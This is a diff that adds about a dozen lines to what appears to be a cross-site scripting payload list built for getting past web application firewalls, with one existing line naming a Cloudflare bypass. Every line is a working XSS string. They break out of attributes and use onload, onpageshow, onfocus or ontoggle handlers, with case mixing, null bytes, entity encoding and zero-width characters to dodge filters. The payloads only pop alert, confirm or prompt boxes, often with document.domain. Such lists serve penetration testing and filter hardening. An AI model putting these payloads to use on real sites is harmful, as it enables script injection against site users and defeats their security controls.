@@ -10,3 +10,14 @@
 "><Svg Only=1 OnLoad​=confirm(atob("Q2xvdWRmbGFyZSBYU1Mg"))>
 ["');alert('XSS');//"]
 "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
+<<TexTArEa/%00//%00/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+"><body/oNpagEshoW=(confirm)(document.domain)>
+"><svg/class=test onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+"prompt(document.domain)"
+"><body/oNpagEshoW​=(prompt)()>
+"><body/oNpagEshoW​=(prompt)(document.domain)>
+"><input/onfocus​=(confirm)(document.domain)>
+"><body/oNpagEshoW​=(confirm)(document.domain)>
+"><body/onfocus​=(confirm)(document.domain)>
+"><Body/oNpagEshoW​=(prompt)(1)>
+"><svg only=1 onload=prompt(document.domain)>
